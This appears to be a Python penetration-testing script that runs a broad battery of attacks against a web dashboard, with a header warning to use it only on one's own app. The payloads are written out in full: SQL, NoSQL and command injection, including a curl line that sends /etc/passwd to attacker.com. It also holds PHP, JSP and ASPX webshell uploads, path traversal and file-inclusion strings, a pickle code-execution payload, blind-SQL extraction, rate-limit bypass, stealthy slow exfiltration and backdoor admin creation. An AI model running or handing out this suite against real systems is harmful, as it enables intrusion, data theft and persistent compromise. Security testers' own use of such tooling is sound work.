#!/usr/bin/env python3
"""
Automated Security Attack Suite
Comprehensive penetration testing script for e-commerce dashboard
⚠️ USE ONLY ON YOUR OWN APPLICATION - TESTING ON UNAUTHORIZED SYSTEMS IS ILLEGAL ⚠️
"""

import requests
import json
import time
import base64
import urllib.parse
import random
import string
import hashlib
import os
import re
import dns.resolver
from datetime import datetime
from typing import Dict, List, Tuple
import concurrent.futures
import logging
from pathlib import Path
from prometheus_client import push_to_gateway, CollectorRegistry, Counter, Gauge

# Configuration
TARGET_URL = "http://127.0.0.1:8050"
REPORT_DIR = "security-reports/attack-results"
EXFILTRATION_DIR = "security-reports/exfiltrated-data"
PROMETHEUS_PUSHGATEWAY = "http://127.0.0.1:9091"  # Prometheus Pushgateway for metrics

# Create output directories first
Path(REPORT_DIR).mkdir(parents=True, exist_ok=True)
Path(EXFILTRATION_DIR).mkdir(parents=True, exist_ok=True)

# Setup logging after directories are created
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'{REPORT_DIR}/attack_log_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class VulnerabilityScanner:
    """Main vulnerability scanner class"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'target': target_url,
            'vulnerabilities': [],
            'exfiltrated_data': []
        }
        self.authenticated = False
        
        # Setup Prometheus metrics
        self.registry = CollectorRegistry()
        self.attack_counter = Counter(
            'security_attacks_total',
            'Total security attacks performed',
            ['attack_type', 'severity', 'category'],
            registry=self.registry
        )
        self.vulnerability_gauge = Gauge(
            'security_vulnerabilities_found',
            'Number of vulnerabilities found',
            ['severity'],
            registry=self.registry
        )
    
    def save_exfiltrated_data(self, category: str, data: any, filename: str = None):
        """Save exfiltrated data to file"""
        if filename is None:
            filename = f"{category}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        filepath = os.path.join(EXFILTRATION_DIR, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"✓ Data exfiltrated to: {filepath}")
        self.results['exfiltrated_data'].append({
            'category': category,
            'file': filepath,
            'timestamp': datetime.now().isoformat()
        })
    
    def add_vulnerability(self, category: str, severity: str, description: str, proof: str = None):
        """Add discovered vulnerability to results"""
        vuln = {
            'category': category,
            'severity': severity,
            'description': description,
            'proof': proof,
            'timestamp': datetime.now().isoformat()
        }
        self.results['vulnerabilities'].append(vuln)
        logger.warning(f"🚨 {severity} - {category}: {description}")
        
        # Push metric to Prometheus
        self.attack_counter.labels(
            attack_type=category.lower().replace(' ', '_'),
            severity=severity.lower(),
            category='vulnerability'
        ).inc()
        
        # Send to Pushgateway
        try:
            push_to_gateway(
                PROMETHEUS_PUSHGATEWAY,
                job='security_attacks',
                registry=self.registry
            )
        except Exception as e:
            logger.debug(f"Failed to push metrics to Prometheus: {e}")
    
    # ============================================================================
    # 1. INJECTION ATTACKS
    # ============================================================================
    
    def sql_injection_attacks(self):
        """SQL Injection testing"""
        logger.info("🔍 Testing SQL Injection vulnerabilities...")
        
        # Classic SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            # Time-based blind SQL injection
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5('A'))--",
            "'; WAITFOR DELAY '00:00:05'--",
            # Boolean-based blind
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
            # Stacked queries
            "1'; DROP TABLE users--",
            "1'; UPDATE users SET password='hacked'--",
            # Second-order injection
            "admin'||'@'||'email.com",
        ]
        
        # Test login form
        for payload in sql_payloads:
            try:
                start_time = time.time()
                response = self.session.post(
                    f"{self.target_url}/login",
                    data={
                        'username': payload,
                        'password': payload
                    },
                    timeout=10
                )
                elapsed = time.time() - start_time
                
                # Check for SQL errors in response
                sql_errors = [
                    'sql syntax',
                    'mysql',
                    'postgresql',
                    'sqlite',
                    'oracle',
                    'odbc',
                    'jdbc',
                    'error in your sql',
                    'warning: mysql',
                    'unclosed quotation mark',
                    'quoted string not properly terminated'
                ]
                
                response_lower = response.text.lower()
                for error in sql_errors:
                    if error in response_lower:
                        self.add_vulnerability(
                            'SQL Injection',
                            'CRITICAL',
                            f'SQL error exposed with payload: {payload}',
                            response.text[:500]
                        )
                        self.save_exfiltrated_data('sql_injection', {
                            'payload': payload,
                            'response': response.text[:1000]
                        })
                
                # Time-based detection
                if 'SLEEP' in payload or 'WAITFOR' in payload:
                    if elapsed > 5:
                        self.add_vulnerability(
                            'Blind SQL Injection (Time-based)',
                            'CRITICAL',
                            f'Time delay detected: {elapsed:.2f}s with payload: {payload}'
                        )
                
            except Exception as e:
                logger.debug(f"SQL injection test failed: {e}")
    
    def nosql_injection_attacks(self):
        """NoSQL Injection testing (MongoDB, etc.)"""
        logger.info("🔍 Testing NoSQL Injection vulnerabilities...")
        
        nosql_payloads = [
            {'$ne': None},
            {'$ne': ''},
            {'$gt': ''},
            {'$regex': '.*'},
            {'$where': '1==1'},
            "admin' || '1'=='1",
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        ]
        
        for payload in nosql_payloads:
            try:
                # Test with JSON payload
                response = self.session.post(
                    f"{self.target_url}/login",
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )
                
                if response.status_code == 200 or 'success' in response.text.lower():
                    self.add_vulnerability(
                        'NoSQL Injection',
                        'CRITICAL',
                        f'NoSQL injection successful with payload: {payload}',
                        response.text[:500]
                    )
                    self.save_exfiltrated_data('nosql_injection', {
                        'payload': str(payload),
                        'response': response.text[:1000]
                    })
            except Exception as e:
                logger.debug(f"NoSQL injection test failed: {e}")
    
    def command_injection_attacks(self):
        """Command Injection testing"""
        logger.info("🔍 Testing Command Injection vulnerabilities...")
        
        # Command injection payloads
        cmd_payloads = [
            "; ls -la",
            "| ls -la",
            "& dir",
            "&& dir",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "`whoami`",
            "$(whoami)",
            "; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)",
            "; ping -c 10 127.0.0.1",  # Time-based detection
        ]
        
        # Test various endpoints
        test_params = ['username', 'email', 'search', 'file', 'path', 'cmd']
        
        for param in test_params:
            for payload in cmd_payloads:
                try:
                    start_time = time.time()
                    response = self.session.get(
                        f"{self.target_url}/_dash-update-component",
                        params={param: payload}
                    )
                    elapsed = time.time() - start_time
                    
                    # Check for command execution indicators
                    indicators = ['root:', 'bin/bash', 'uid=', 'gid=', 'groups=']
                    for indicator in indicators:
                        if indicator in response.text:
                            self.add_vulnerability(
                                'Command Injection',
                                'CRITICAL',
                                f'Command injection successful: {param}={payload}',
                                response.text[:500]
                            )
                            self.save_exfiltrated_data('command_injection', {
                                'param': param,
                                'payload': payload,
                                'response': response.text[:1000]
                            })
                    
                    # Time-based detection for ping
                    if 'ping' in payload and elapsed > 10:
                        self.add_vulnerability(
                            'Command Injection (Time-based)',
                            'CRITICAL',
                            f'Command execution detected via timing: {elapsed:.2f}s'
                        )
                
                except Exception as e:
                    logger.debug(f"Command injection test failed: {e}")
    
    def ldap_injection_attacks(self):
        """LDAP Injection testing"""
        logger.info("🔍 Testing LDAP Injection vulnerabilities...")
        
        ldap_payloads = [
            "*",
            "*)(&",
            "*)(uid=*)",
            "admin)(&(password=*)",
            "*)(objectClass=*",
        ]
        
        for payload in ldap_payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/login",
                    data={'username': payload, 'password': 'test'}
                )
                
                if 'success' in response.text.lower() or response.status_code == 200:
                    self.add_vulnerability(
                        'LDAP Injection',
                        'HIGH',
                        f'LDAP injection possible with: {payload}'
                    )
            except Exception as e:
                logger.debug(f"LDAP injection test failed: {e}")
    
    def xpath_injection_attacks(self):
        """XPath Injection testing"""
        logger.info("🔍 Testing XPath Injection vulnerabilities...")
        
        xpath_payloads = [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "'] | //user/* | a[' or '1'='1",
        ]
        
        for payload in xpath_payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/login",
                    data={'username': payload, 'password': payload}
                )
                
                if response.status_code == 200:
                    self.add_vulnerability(
                        'XPath Injection',
                        'HIGH',
                        f'Potential XPath injection: {payload}'
                    )
            except Exception as e:
                logger.debug(f"XPath injection test failed: {e}")
    
    # ============================================================================
    # 2. DATA EXPOSURE & LEAKAGE
    # ============================================================================
    
    def sensitive_data_exposure(self):
        """Test for sensitive data exposure"""
        logger.info("🔍 Testing Sensitive Data Exposure...")
        
        # Common sensitive files
        sensitive_paths = [
            '/.env',
            '/.git/config',
            '/.git/HEAD',
            '/config.json',
            '/config.yml',
            '/docker-compose.yml',
            '/Dockerfile',
            '/.dockerignore',
            '/users.json',
            '/dashboard/users.json',
            '/backup.sql',
            '/database.db',
            '/.bash_history',
            '/.ssh/id_rsa',
            '/id_rsa',
            '/secrets.txt',
            '/passwords.txt',
            '/credentials.json',
            '/aws_credentials',
            '/.aws/credentials',
            '/package.json',
            '/requirements.txt',
            '/composer.json',
            '/web.config',
            '/phpinfo.php',
            '/info.php',
            '/server-status',
            '/server-info',
        ]
        
        exposed_data = []
        
        for path in sensitive_paths:
            try:
                response = self.session.get(f"{self.target_url}{path}", timeout=5)
                
                if response.status_code == 200 and len(response.content) > 0:
                    self.add_vulnerability(
                        'Sensitive Data Exposure',
                        'HIGH',
                        f'Sensitive file exposed: {path}',
                        response.text[:200]
                    )
                    
                    exposed_data.append({
                        'path': path,
                        'content': response.text,
                        'size': len(response.content)
                    })
            
            except Exception as e:
                logger.debug(f"File exposure test failed for {path}: {e}")
        
        if exposed_data:
            self.save_exfiltrated_data('sensitive_files', exposed_data)
    
    def information_disclosure(self):
        """Test for information disclosure"""
        logger.info("🔍 Testing Information Disclosure...")
        
        # Test error pages
        error_urls = [
            '/nonexistent-page-12345',
            '/%00',
            '/null',
            '/../../../etc/passwd',
        ]
        
        for url in error_urls:
            try:
                response = self.session.get(f"{self.target_url}{url}")
                
                # Look for information disclosure in errors
                disclosure_patterns = [
                    r'File "(/.*?\.py)"',  # Python file paths
                    r'line \d+',  # Line numbers
                    r'Traceback',  # Stack traces
                    r'DEBUG\s*=\s*True',
                    r'SECRET_KEY\s*=\s*[\'"](.+?)[\'"]',
                    r'password[\'"]?\s*[:=]\s*[\'"]?(\w+)',
                    r'Database.*?at\s+(\S+)',
                    r'version\s*[:=]\s*[\'"]?(\d+\.\d+)',
                ]
                
                for pattern in disclosure_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        self.add_vulnerability(
                            'Information Disclosure',
                            'MEDIUM',
                            f'Information leaked in error page: {pattern}',
                            str(matches)[:200]
                        )
            
            except Exception as e:
                logger.debug(f"Information disclosure test failed: {e}")
    
    def insecure_data_storage(self):
        """Test for insecure data storage"""
        logger.info("🔍 Testing Insecure Data Storage...")
        
        # Try to access session/cookie data
        cookies = self.session.cookies.get_dict()
        if cookies:
            for name, value in cookies.items():
                # Check if sensitive data in cookies
                if any(keyword in name.lower() for keyword in ['session', 'token', 'auth', 'user']):
                    # Check if encrypted
                    if len(value) < 50 or value.startswith('user'):
                        self.add_vulnerability(
                            'Insecure Data Storage',
                            'MEDIUM',
                            f'Cookie may contain unencrypted data: {name}',
                            value[:50]
                        )
            
            self.save_exfiltrated_data('cookies', cookies)
    
    # ============================================================================
    # 3. DATA MANIPULATION
    # ============================================================================
    
    def parameter_tampering(self):
        """Test parameter tampering"""
        logger.info("🔍 Testing Parameter Tampering...")
        
        # Test various parameter modifications
        tampered_requests = [
            {'user_id': '1', 'role': 'admin'},
            {'user_id': '2', 'is_admin': 'true'},
            {'user_id': '1', 'permissions': 'all'},
            {'price': '-100'},
            {'quantity': '999999'},
            {'discount': '100'},
        ]
        
        for params in tampered_requests:
            try:
                response = self.session.get(
                    f"{self.target_url}/_dash-update-component",
                    params=params
                )
                
                if response.status_code == 200:
                    self.add_vulnerability(
                        'Parameter Tampering',
                        'HIGH',
                        f'Parameter tampering may be possible: {params}'
                    )
            except Exception as e:
                logger.debug(f"Parameter tampering test failed: {e}")
    
    def mass_assignment(self):
        """Test mass assignment vulnerabilities"""
        logger.info("🔍 Testing Mass Assignment...")
        
        # Try to inject additional fields
        payloads = [
            {'username': 'testuser', 'password': 'test123', 'role': 'admin'},
            {'username': 'testuser', 'password': 'test123', 'is_admin': True},
            {'username': 'testuser', 'password': 'test123', 'permissions': ['all']},
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/register",
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )
                
                if response.status_code in [200, 201]:
                    self.add_vulnerability(
                        'Mass Assignment',
                        'HIGH',
                        f'Mass assignment may be possible with: {payload}'
                    )
            except Exception as e:
                logger.debug(f"Mass assignment test failed: {e}")
    
    def race_condition(self):
        """Test for race conditions"""
        logger.info("🔍 Testing Race Conditions...")
        
        def make_request():
            return self.session.post(
                f"{self.target_url}/api/purchase",
                json={'product_id': '1', 'quantity': 1}
            )
        
        # Send multiple concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        # Check if all succeeded (possible race condition)
        success_count = sum(1 for r in results if r.status_code == 200)
        if success_count > 1:
            self.add_vulnerability(
                'Race Condition',
                'HIGH',
                f'Race condition detected: {success_count} concurrent requests succeeded'
            )
    
    def business_logic_abuse(self):
        """Test business logic flaws"""
        logger.info("🔍 Testing Business Logic Abuse...")
        
        # Test negative quantities
        abuse_tests = [
            {'product_id': '1', 'quantity': -1},
            {'product_id': '1', 'price': 0},
            {'discount_code': '../../../etc/passwd'},
            {'referral_code': 'A' * 10000},  # Buffer overflow
        ]
        
        for test in abuse_tests:
            try:
                response = self.session.post(
                    f"{self.target_url}/api/order",
                    json=test
                )
                
                if response.status_code == 200:
                    self.add_vulnerability(
                        'Business Logic Abuse',
                        'MEDIUM',
                        f'Business logic may not validate: {test}'
                    )
            except Exception as e:
                logger.debug(f"Business logic test failed: {e}")
    
    # ============================================================================
    # 4. FILE ATTACKS
    # ============================================================================
    
    def file_upload_vulnerability(self):
        """Test file upload vulnerabilities"""
        logger.info("🔍 Testing File Upload Vulnerabilities...")
        
        # Malicious file payloads
        malicious_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/jsp'),
            ('shell.py', 'import os; os.system("whoami")', 'text/x-python'),
            ('webshell.aspx', '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe");%>', 'text/plain'),
            ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain'),
            ('test.jpg.php', '<?php phpinfo(); ?>', 'image/jpeg'),  # Double extension
        ]
        
        for filename, content, mimetype in malicious_files:
            try:
                files = {'file': (filename, content, mimetype)}
                response = self.session.post(
                    f"{self.target_url}/upload",
                    files=files
                )
                
                if response.status_code in [200, 201]:
                    self.add_vulnerability(
                        'File Upload Vulnerability',
                        'CRITICAL',
                        f'Malicious file upload accepted: {filename}'
                    )
            except Exception as e:
                logger.debug(f"File upload test failed: {e}")
    
    def path_traversal(self):
        """Test path traversal vulnerabilities"""
        logger.info("🔍 Testing Path Traversal...")
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',  # Double encoding
            '/etc/passwd',
            'C:\\Windows\\System32\\config\\sam',
            '/var/www/html/dashboard/users.json',
            '../dashboard/users.json',
            '../../dashboard/users.json',
            '../../../dashboard/users.json',
        ]
        
        for payload in traversal_payloads:
            try:
                # Test in various parameters
                response = self.session.get(
                    f"{self.target_url}/download",
                    params={'file': payload}
                )
                
                # Check for file contents
                if 'root:' in response.text or 'Administrator' in response.text or 'password' in response.text:
                    self.add_vulnerability(
                        'Path Traversal',
                        'CRITICAL',
                        f'Path traversal successful: {payload}',
                        response.text[:200]
                    )
                    self.save_exfiltrated_data('path_traversal', {
                        'payload': payload,
                        'content': response.text
                    })
            except Exception as e:
                logger.debug(f"Path traversal test failed: {e}")
    
    def local_file_inclusion(self):
        """Test Local File Inclusion (LFI)"""
        logger.info("🔍 Testing Local File Inclusion...")
        
        lfi_payloads = [
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
            'expect://whoami',
            '/proc/self/environ',
            '/var/log/apache2/access.log',
        ]
        
        for payload in lfi_payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/page",
                    params={'file': payload}
                )
                
                if response.status_code == 200 and len(response.content) > 0:
                    self.add_vulnerability(
                        'Local File Inclusion',
                        'CRITICAL',
                        f'LFI possible with: {payload}'
                    )
            except Exception as e:
                logger.debug(f"LFI test failed: {e}")
    
    def remote_file_inclusion(self):
        """Test Remote File Inclusion (RFI)"""
        logger.info("🔍 Testing Remote File Inclusion...")
        
        # Note: In real testing, you would use your own server
        rfi_payloads = [
            'http://attacker.com/shell.txt',
            'https://pastebin.com/raw/malicious',
        ]
        
        for payload in rfi_payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/include",
                    params={'url': payload}
                )
                
                if response.status_code == 200:
                    self.add_vulnerability(
                        'Remote File Inclusion',
                        'CRITICAL',
                        f'RFI may be possible with: {payload}'
                    )
            except Exception as e:
                logger.debug(f"RFI test failed: {e}")
    
    # ============================================================================
    # 5. SERIALIZATION ATTACKS
    # ============================================================================
    
    def insecure_deserialization(self):
        """Test insecure deserialization"""
        logger.info("🔍 Testing Insecure Deserialization...")
        
        # Python pickle payload (DANGEROUS - for testing only!)
        pickle_payloads = [
            # Base64 encoded pickle that executes 'whoami'
            'gASVLAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=',
        ]
        
        for payload in pickle_payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/api/data",
                    data=payload,
                    headers={'Content-Type': 'application/octet-stream'}
                )
                
                if 'error' not in response.text.lower():
                    self.add_vulnerability(
                        'Insecure Deserialization',
                        'CRITICAL',
                        'Application may deserialize untrusted data'
                    )
            except Exception as e:
                logger.debug(f"Deserialization test failed: {e}")
    
    # ============================================================================
    # 6. ATTACK CHAINING
    # ============================================================================
    
    def attack_chain_information_to_access(self):
        """Chain: Information Disclosure → Broken Access Control → Data Exfiltration"""
        logger.info("🔍 Testing Attack Chain: Info Disclosure → Access Control → Exfiltration...")
        
        # Step 1: Information Disclosure - Get user IDs
        try:
            response = self.session.get(f"{self.target_url}/api/users")
            if response.status_code == 200:
                users_data = response.json()
                self.add_vulnerability(
                    'Attack Chain - Step 1',
                    'HIGH',
                    'User enumeration possible',
                    str(users_data)[:200]
                )
                
                # Step 2: Broken Access Control - Access other users' data
                if users_data:
                    for user in users_data:
                        user_id = user.get('id')
                        response2 = self.session.get(f"{self.target_url}/api/user/{user_id}/data")
                        
                        if response2.status_code == 200:
                            self.add_vulnerability(
                                'Attack Chain - Step 2',
                                'CRITICAL',
                                f'Unauthorized access to user {user_id} data'
                            )
                            
                            # Step 3: Data Exfiltration
                            self.save_exfiltrated_data('attack_chain_users', response2.json())
        
        except Exception as e:
            logger.debug(f"Attack chain test failed: {e}")
    
    # ============================================================================
    # 7. ADVANCED INJECTIONS
    # ============================================================================
    
    def blind_sql_injection(self):
        """Blind SQL Injection (Boolean and Time-based)"""
        logger.info("🔍 Testing Blind SQL Injection...")
        
        # Boolean-based blind SQL injection
        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"
        
        try:
            response_true = self.session.get(
                f"{self.target_url}/product",
                params={'id': true_payload}
            )
            
            response_false = self.session.get(
                f"{self.target_url}/product",
                params={'id': false_payload}
            )
            
            # If responses differ, boolean-based SQLi is possible
            if len(response_true.content) != len(response_false.content):
                self.add_vulnerability(
                    'Blind SQL Injection (Boolean-based)',
                    'CRITICAL',
                    'Boolean-based blind SQL injection detected'
                )
                
                # Exfiltrate data character by character
                self.exfiltrate_via_blind_sql()
        
        except Exception as e:
            logger.debug(f"Blind SQL injection test failed: {e}")
    
    def exfiltrate_via_blind_sql(self):
        """Exfiltrate data using blind SQL injection"""
        logger.info("🔍 Exfiltrating data via Blind SQL Injection...")
        
        # Extract database name character by character
        extracted = ""
        for position in range(1, 20):
            for ascii_val in range(32, 127):
                payload = f"1' AND ASCII(SUBSTRING(DATABASE(),{position},1))={ascii_val}--"
                
                try:
                    response = self.session.get(
                        f"{self.target_url}/product",
                        params={'id': payload},
                        timeout=5
                    )
                    
                    if "success" in response.text.lower() or response.status_code == 200:
                        extracted += chr(ascii_val)
                        logger.info(f"Extracted character: {chr(ascii_val)}")
                        break
                except:
                    pass
            
            if position > len(extracted):
                break
        
        if extracted:
            self.save_exfiltrated_data('blind_sql_exfiltration', {'database_name': extracted})
    
    def second_order_injection(self):
        """Test second-order injection"""
        logger.info("🔍 Testing Second-Order Injection...")
        
        # Store malicious payload
        malicious_username = "admin'--"
        
        try:
            # Step 1: Store payload
            self.session.post(
                f"{self.target_url}/register",
                data={'username': malicious_username, 'password': 'test123'}
            )
            
            # Step 2: Trigger payload in another context
            response = self.session.get(f"{self.target_url}/profile/{malicious_username}")
            
            if 'error' in response.text.lower() or 'sql' in response.text.lower():
                self.add_vulnerability(
                    'Second-Order Injection',
                    'HIGH',
                    'Second-order SQL injection possible'
                )
        
        except Exception as e:
            logger.debug(f"Second-order injection test failed: {e}")
    
    def polyglot_injection(self):
        """Test polyglot injection payloads"""
        logger.info("🔍 Testing Polyglot Injection...")
        
        # Polyglot payloads that work in multiple contexts
        polyglot_payloads = [
            # SQL + XSS + JavaScript
            "'-alert(1)-'",
            # SQL + Command Injection
            "'; ping -c 5 127.0.0.1 && echo '",
            # Multi-language
            "1';SELECT/**/1/**/FROM/**/users;--<script>alert(1)</script>",
        ]
        
        for payload in polyglot_payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/search",
                    data={'query': payload}
                )
                
                # Check for execution in any context
                if any(indicator in response.text for indicator in ['alert(1)', 'root:', 'uid=']):
                    self.add_vulnerability(
                        'Polyglot Injection',
                        'CRITICAL',
                        f'Polyglot injection successful: {payload}'
                    )
            except Exception as e:
                logger.debug(f"Polyglot injection test failed: {e}")
    
    # ============================================================================
    # 8. API ATTACKS
    # ============================================================================
    
    def excessive_data_exposure(self):
        """Test for excessive data exposure in APIs"""
        logger.info("🔍 Testing Excessive Data Exposure...")
        
        api_endpoints = [
            '/api/users',
            '/api/user/1',
            '/api/profile',
            '/api/admin',
            '/_dash-component-suites',
            '/_dash-layout',
            '/_dash-dependencies',
        ]
        
        for endpoint in api_endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")
                
                if response.status_code == 200:
                    # Check for sensitive data in response
                    sensitive_keywords = ['password', 'secret', 'token', 'key', 'ssn', 'credit_card']
                    
                    response_lower = response.text.lower()
                    for keyword in sensitive_keywords:
                        if keyword in response_lower:
                            self.add_vulnerability(
                                'Excessive Data Exposure',
                                'HIGH',
                                f'Sensitive data exposed in {endpoint}: {keyword}',
                                response.text[:200]
                            )
                            self.save_exfiltrated_data('api_data_exposure', {
                                'endpoint': endpoint,
                                'data': response.text[:1000]
                            })
            
            except Exception as e:
                logger.debug(f"API exposure test failed: {e}")
    
    def bola_attack(self):
        """Test BOLA (Broken Object Level Authorization)"""
        logger.info("🔍 Testing BOLA (Broken Object Level Authorization)...")
        
        # Try to access other users' objects
        user_ids = range(1, 100)
        
        for user_id in user_ids:
            try:
                response = self.session.get(f"{self.target_url}/api/user/{user_id}/profile")
                
                if response.status_code == 200:
                    self.add_vulnerability(
                        'BOLA',
                        'HIGH',
                        f'Unauthorized access to user {user_id} profile',
                        response.text[:200]
                    )
                    self.save_exfiltrated_data('bola_attack', {
                        'user_id': user_id,
                        'data': response.text[:500]
                    })
            
            except Exception as e:
                pass
    
    def graphql_abuse(self):
        """Test GraphQL vulnerabilities"""
        logger.info("🔍 Testing GraphQL Abuse...")
        
        # GraphQL introspection query
        introspection_query = {
            'query': '''
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                        }
                    }
                }
            }
            '''
        }
        
        try:
            response = self.session.post(
                f"{self.target_url}/graphql",
                json=introspection_query
            )
            
            if response.status_code == 200:
                self.add_vulnerability(
                    'GraphQL Introspection',
                    'MEDIUM',
                    'GraphQL introspection enabled',
                    response.text[:500]
                )
                self.save_exfiltrated_data('graphql_schema', response.json())
        
        except Exception as e:
            logger.debug(f"GraphQL test failed: {e}")
        
        # Test for GraphQL batch attacks
        batch_query = [
            {'query': '{ users { id username email } }'},
            {'query': '{ users { id username email } }'},
        ] * 50  # 100 queries in one request
        
        try:
            response = self.session.post(
                f"{self.target_url}/graphql",
                json=batch_query
            )
            
            if response.status_code == 200:
                self.add_vulnerability(
                    'GraphQL Batch Attack',
                    'HIGH',
                    'GraphQL accepts batched queries without rate limiting'
                )
        except Exception as e:
            logger.debug(f"GraphQL batch test failed: {e}")
    
    # ============================================================================
    # 9. SUPPLY CHAIN ATTACKS
    # ============================================================================
    
    def dependency_vulnerability_check(self):
        """Check for vulnerable dependencies"""
        logger.info("🔍 Testing for Vulnerable Dependencies...")
        
        # Try to get package information
        package_files = [
            '/package.json',
            '/requirements.txt',
            '/composer.json',
            '/Gemfile',
        ]
        
        for pkg_file in package_files:
            try:
                response = self.session.get(f"{self.target_url}{pkg_file}")
                
                if response.status_code == 200:
                    self.add_vulnerability(
                        'Supply Chain - Dependency Exposure',
                        'MEDIUM',
                        f'Dependency file exposed: {pkg_file}',
                        response.text[:200]
                    )
                    self.save_exfiltrated_data('dependencies', {
                        'file': pkg_file,
                        'content': response.text
                    })
            except Exception as e:
                logger.debug(f"Dependency check failed: {e}")
    
    # ============================================================================
    # 10. LOW & SLOW ATTACKS
    # ============================================================================
    
    def slow_data_exfiltration(self):
        """Simulate slow data exfiltration"""
        logger.info("🔍 Testing Slow Data Exfiltration...")
        
        # Exfiltrate data slowly to avoid detection
        endpoints = [
            '/api/users?page=1',
            '/api/users?page=2',
            '/api/products?page=1',
            '/api/orders?page=1',
        ]
        
        exfiltrated = []
        
        for endpoint in endpoints:
            try:
                time.sleep(random.uniform(5, 15))  # Random delay
                
                response = self.session.get(f"{self.target_url}{endpoint}")
                
                if response.status_code == 200:
                    exfiltrated.append({
                        'endpoint': endpoint,
                        'data': response.text[:500]
                    })
                    logger.info(f"Slowly exfiltrated data from {endpoint}")
            
            except Exception as e:
                logger.debug(f"Slow exfiltration failed: {e}")
        
        if exfiltrated:
            self.save_exfiltrated_data('slow_exfiltration', exfiltrated)
    
    def rate_limit_bypass(self):
        """Test rate limiting bypass techniques"""
        logger.info("🔍 Testing Rate Limit Bypass...")
        
        # Technique 1: IP rotation headers
        bypass_headers = [
            {'X-Forwarded-For': '1.2.3.4'},
            {'X-Real-IP': '5.6.7.8'},
            {'X-Originating-IP': '9.10.11.12'},
            {'X-Client-IP': '13.14.15.16'},
        ]
        
        for headers in bypass_headers:
            for i in range(100):
                try:
                    response = self.session.post(
                        f"{self.target_url}/login",
                        data={'username': 'admin', 'password': f'test{i}'},
                        headers=headers
                    )
                    
                    if response.status_code != 429:  # Not rate limited
                        self.add_vulnerability(
                            'Rate Limit Bypass',
                            'MEDIUM',
                            f'Rate limiting bypassed with headers: {headers}'
                        )
                        break
                except Exception as e:
                    pass
    
    # ============================================================================
    # 11. PERSISTENCE ATTACKS
    # ============================================================================
    
    def webshell_detection(self):
        """Test if webshells can be uploaded/detected"""
        logger.info("🔍 Testing Webshell Upload...")
        
        # Various webshell formats
        webshells = [
            ('shell.php', '<?php @eval($_POST["cmd"]);?>'),
            ('shell.aspx', '<%@ Page Language="C#" %><%eval(Request["cmd"]);%>'),
            ('shell.jsp', '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'),
        ]
        
        for filename, content in webshells:
            try:
                files = {'file': (filename, content, 'text/plain')}
                response = self.session.post(
                    f"{self.target_url}/upload",
                    files=files
                )
                
                if response.status_code in [200, 201]:
                    self.add_vulnerability(
                        'Webshell Upload',
                        'CRITICAL',
                        f'Webshell upload successful: {filename}'
                    )
            except Exception as e:
                logger.debug(f"Webshell upload test failed: {e}")
    
    def backdoor_functionality_abuse(self):
        """Test abuse of legitimate functionality for backdoors"""
        logger.info("🔍 Testing Backdoor via Legitimate Functionality...")
        
        # Try to create admin user via registration
        try:
            response = self.session.post(
                f"{self.target_url}/register",
                json={
                    'username': 'backdoor_admin',
                    'password': 'BackdoorPass123!',
                    'role': 'admin',
                    'permissions': 'all'
                }
            )
            
            if response.status_code in [200, 201]:
                # Try to login
                login_response = self.session.post(
                    f"{self.target_url}/login",
                    data={'username': 'backdoor_admin', 'password': 'BackdoorPass123!'}
                )
                
                if 'success' in login_response.text.lower():
                    self.add_vulnerability(
                        'Backdoor via Legitimate Functionality',
                        'CRITICAL',
                        'Created admin account via registration'
                    )
        
        except Exception as e:
            logger.debug(f"Backdoor test failed: {e}")
    
